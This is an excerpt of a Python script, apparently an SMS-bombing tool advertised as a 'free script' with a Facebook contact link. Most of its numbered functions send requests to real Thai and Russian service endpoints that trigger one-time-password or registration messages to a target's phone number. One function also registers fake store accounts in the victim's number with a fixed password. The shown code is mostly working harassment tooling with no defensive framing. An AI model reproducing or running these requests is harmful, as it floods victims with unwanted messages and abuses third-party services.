...
print("")
time.sleep(1)
print("fb.https://www.facebook.com/profile.php?id=100050612791525")
print ("ของซื้อ80api")
time.sleep(3)
print ("")
print ("")
...
def api1():
	...
	print (f"𝒇𝒓𝒆𝒆 𝒔𝒄𝒓𝒊𝒑𝒕 | {phone} | EH4404")
...
def api9():
	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": "0"+phone,"country":"66"},"type":"mobile"})
	print (f"𝒇𝒓𝒆𝒆 𝒔𝒄𝒓𝒊𝒑𝒕 | {phone} | EH4404")
...
def api17():
	...
	print (f"𝒇𝒓𝒆𝒆 𝒔𝒄𝒓𝒊𝒑𝒕 | {i+1} | EH4404")
...
def api33():
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username":"0"+phone})
	print (f"𝒇𝒓𝒆𝒆 𝒔𝒄𝒓𝒊𝒑𝒕 | {i+1} | EH4404")
...
def api42():
	...
	print (f"𝒇𝒓𝒆𝒆 𝒔𝒄𝒓??𝒑𝒕 | {i+1} | EH4404")
...
def api54():
	requests.get("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username":phone,"password":"1111a1111A","name":phone,"provinceCode":"74","districtCode":"970","subdistrictCode":"8654","zipcode":"94140","siebelCustomerTypeId":"710","locale":"th_TH"},headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"})
	print (f"𝒇𝒓𝒆𝒆 𝒔𝒄𝒓𝒊𝒑𝒕 | {i+1} | EH4404")
...
def api58():
	requests.post("https://findclone.ru/register?phone=+66"+phone)
	print (f"𝒇𝒓𝒆𝒆 𝒔𝒄𝒓𝒊𝒑𝒕 | {i+1} | EH4404")
